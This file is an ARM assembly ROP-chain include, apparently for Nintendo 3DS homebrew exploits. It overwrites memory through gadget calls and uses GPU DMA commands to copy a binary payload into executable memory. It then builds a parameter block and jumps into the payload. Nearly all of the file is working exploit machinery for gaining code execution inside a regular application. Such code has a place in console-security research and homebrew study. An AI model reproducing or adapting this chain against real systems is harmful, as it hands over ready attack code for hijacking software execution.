#pragma once

@ This is intended to be included by a regular-application exploit .s.

#ifndef ROPKIT_TMPDATA
	#define ROPKIT_TMPDATA 0x0FFF0000
#endif

#define ropkit_IFile_ctx (ROPKIT_TMPDATA+4)

#define ROPKIT_ROPBAK (ROPKIT_TMPDATA+0x100)

#ifndef ROPKIT_BINLOAD_SIZE
	#define ROPKIT_BINLOAD_SIZE 0xC000
#endif

#define ROPKIT_LINEARMEM_WORKBUF (ROPKIT_LINEARMEM_BUF+ROPKIT_BINLOAD_SIZE)

#ifndef ROPKIT_BINLOAD_ADDR
	#define ROPKIT_BINLOAD_ADDR ROPBUF+0x400
#endif

#ifndef ROPKIT_BINLOAD_TEXTOFFSET
	#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000
#endif

#ifndef ROPKIT_BINPAYLOAD_PATH
	#define ROPKIT_BINPAYLOAD_PATH "data:/payload.bin"
#endif

#ifndef ROPKIT_OTHERAPP_NEWSP_ADDR
	#define ROPKIT_OTHERAPP_NEWSP_ADDR (0x10000000-4)
#endif

#define ROPKIT_TRANSFER_CHUNKSIZE 0x100000

#ifdef ROPKIT_ENABLETERMINATE_GSPTHREAD
@ Set the flag for terminating the GSP thread.
@CALLFUNC_R0R1 svcSleepThread, 0x80000000,0
@ROPMACRO_WRITEWORD GSPTHREAD_OBJECTADDR+0x77, 0x1

CALLFUNC_NOSP MEMSET32_OTHER+4, 0x0ffff800, 0x7f0, svcSleepThread, 0
CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88-0x200, 0x210, 0x148d5b88, 0
CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88+0x10, 0x100, svcSleepThread, 0



#endif
/*
@CALLFUNC_NOSP MEMCPY, ROPKIT_BINLOAD_ADDR, 0x00381800, ROPKIT_BINLOAD_SIZE, 0

CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPKIT_LINEARMEM_WORKBUF, ROPKIT_TRANSFER_CHUNKSIZE, 0, 0
CALL_GXCMD4 0x17e20520, 0x17ed9f00, 0xf0
CALLFUNC_R0R1 svcSleepThread, 100000000,0

@ Copy APPMEMTYPE to ROPKIT_TMPDATA+0x24.
ROPMACRO_COPYWORD (ROPKIT_TMPDATA+0x24), 0x1FF80030

ROP_LOADR0_FROMADDR (ROPKIT_TMPDATA+0x24)

.word POP_R4PC
.word 0xA00000
.word MUL_R0R4R0
.word 0x17f01000
.word ADD_R0R0R4
.word 0
.word POP_R1PC
.word misc_store
.word ROP_STR_R0TOR1_POPR4
.word 0
@.word misc_store
*/

CALL_GXCMD4 ROPKIT_BINLOAD_ADDR, 0x17fe0000, 0x2000

@ Wait 0.1s for the transfers to finish.
@CALLFUNC_R0R1 svcSleepThread, 100000, 0

#ifdef ROPKIT_BEFOREJUMP_CACHEBUFADDR//Try to get cache invalidated/whatever for otherapp via accessing+flushing memory in linearmem.
CALLFUNC_NOSP MEMCPY, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFADDR+0x100, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0
CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0, 0
#endif

@ Setup the paramblk.

CALLFUNC_NOSP MEMSET32_OTHER, ROPKIT_LINEARMEM_WORKBUF, 0x1000, 0, 0

ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x1c), GXLOW_CMD4
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x20), GSPGPU_FlushDataCache
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x48), 0x8d @ Flags
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x58), GSPGPU_SERVHANDLEADR

@CALLFUNC_R0R1 svcSleepThread, 1000000, 0
@ Jump to the payload.
CALLFUNC_R0R1 (0x00100000 + ROPKIT_BINLOAD_TEXTOFFSET), ROPKIT_LINEARMEM_WORKBUF, ROPKIT_OTHERAPP_NEWSP_ADDR

.word 0x40506070